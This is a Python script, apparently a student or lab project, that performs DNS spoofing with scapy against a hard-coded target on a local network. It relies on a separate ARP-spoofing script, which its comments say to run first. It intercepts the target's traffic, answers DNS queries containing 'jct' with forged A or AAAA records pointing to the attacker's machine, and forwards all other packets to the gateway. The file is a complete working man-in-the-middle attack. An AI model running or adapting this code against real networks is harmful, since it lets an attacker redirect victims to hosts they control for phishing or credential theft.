# python !

import argparse
import time
import sys
import os
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.dhcp import *
from scapy.layers.l2 import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP
from uuid import getnode as get_mac
from python_arptable import *
import netifaces
addrs = netifaces.ifaddresses('eth0')
my_ipV6 = addrs[netifaces.AF_INET6][0]['addr']          # our ipV6 address.


def get_gw_i():                         # method which gives us the ip and mac address of the gateway.
    ip=conf.route.route()[2]
    p_who_has_gw = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip))
    mac = str(p_who_has_gw[0][0][1].hwsrc)
    return ip,mac


def handle_dns_q(pkt):              # the method of the attack, this method taking the jct dns, and return a spoofed address (in our case return our ip address).
    print(pkt.show())
    my_ip=conf.route.route()[1]
    # r=Ether(src=my_mac,dst=target_mac)/IP(dst=pkt[IP].src, src=ip)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=my_ip)/DNSRR(rrname="www.wish.com",rdata=my_ip))/DNSRR(type=41)
    query_name = pkt[DNSQR].qname.decode()          # decoding the qname of the dns packet.
    if(pkt[DNS].qd.qtype == 1):                     # checking if the packet contain a ipV4, and sending a propare spoofed packet with ipV4.
        r=IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
          UDP(dport=pkt[UDP].sport, sport=53)/\
          DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1,
              qd=DNSQR(qtype='A', qname=query_name),
              an=DNSRR(rrname=query_name, rdata=my_ip, type='A'))/\
          DNSRR(type=41)
        send(r, verbose=0, iface="eth0")
    else:                                           # else if the packet contain a 1pV6, sending a propare spoofed packet with ipV6.
        r6=IP(dst=pkt[IP].src, src=pkt[IP].dst)\
           /UDP(dport=pkt[UDP].sport, sport=53)\
           /DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1,
                qd=DNSQR(qtype='AAAA', qname=query_name),
                an=DNSRR(rrname=query_name, rdata=str(my_ipV6), type='AAAA'))\
           /DNSRR(type=41)
        send(r6, verbose=0, iface="eth0")
    print("sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss, we sent a fake dns")


def ret_pkt(pkt):               # this method sending (forwarding) the packets to the gateway.
    pkt[Ether].dst = mac
    sendp(pkt)


def forward_or_not(pkt):                # method that check if we got a dns with "jct" in it.
    if pkt.haslayer(IP):
        if pkt[IP].dst==ip and pkt[IP].src==target_ip:
            if pkt.haslayer(DNS):
                print("dnssssssssssssssssssssssssssssssssssssss, we got dns")
                #if "wish" in str(pkt[DNSQR].qname):
                if "jct" in pkt[DNSQR].qname.decode():
                    print("hereeeeeeeeeeeeeeeee, its a jct")
                    handle_dns_q(pkt)       # active the attack method on jct dns.
                else:
                    ret_pkt(pkt)            # active a simple forwarder method.
            else:
                ret_pkt(pkt)                # active a simple forwarder method.


def forward_pkts():     # method that sniffing a packets and active the method which decide if forward it or not.
    while(1==1):
        pkts=sniff(prn=forward_or_not,count=1)


ip,mac=get_gw_i()           # the gateway ip and mac address.
target_ip="192.168.1.10"    # the ip address of the target.
p_who_has = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip))
target_mac = str(p_who_has[0][0][1].hwsrc)
my_mac = get_mac()
my_mac = str(':'.join(("%012X" % my_mac)[i:i + 2] for i in range(0, 12, 2)))
my_mac = my_mac.lower()         # our mac address.


#pre-attack run sudo python3 /home/kali/Downloads/finalTar2/Arpspoofer.py
#or
#pre-attack run sudo python3 /home/assassinr/PycharmProjects/finalTar2/Arpspoofer.py
def main():         # the main method, starting the programs methods.
    forward_pkts()


def init_docket():              # giving our attacker a socket info.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('', 53))
    return


if __name__ == '__main__':
    listener = init_docket()
    main()

# before we starting this program need first to active the arpspoofer program.